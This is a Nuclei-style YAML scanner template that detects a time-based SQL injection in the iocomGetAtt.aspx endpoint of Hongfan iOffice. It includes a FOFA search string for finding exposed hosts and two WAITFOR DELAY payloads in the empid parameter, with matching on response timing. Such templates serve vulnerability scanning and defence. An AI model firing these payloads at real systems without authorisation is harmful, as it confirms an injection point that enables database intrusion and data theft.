id: redflag-ioffice-iocomgetatt-sql
info:
  name: 红帆iOffice iocomGetAtt接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="红帆-ioffice"
          红帆iOffice系统iocomGetAtt接口存在SQL注入安全缺陷，攻击者可构造恶意SQL查询字符串，通过该接口执行非授权数据库操作，导致敏感数据泄露或数据完整性受损。
  tags: 红帆
http:
- raw:
  - |
    GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
    Connection: close
  - |
    GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
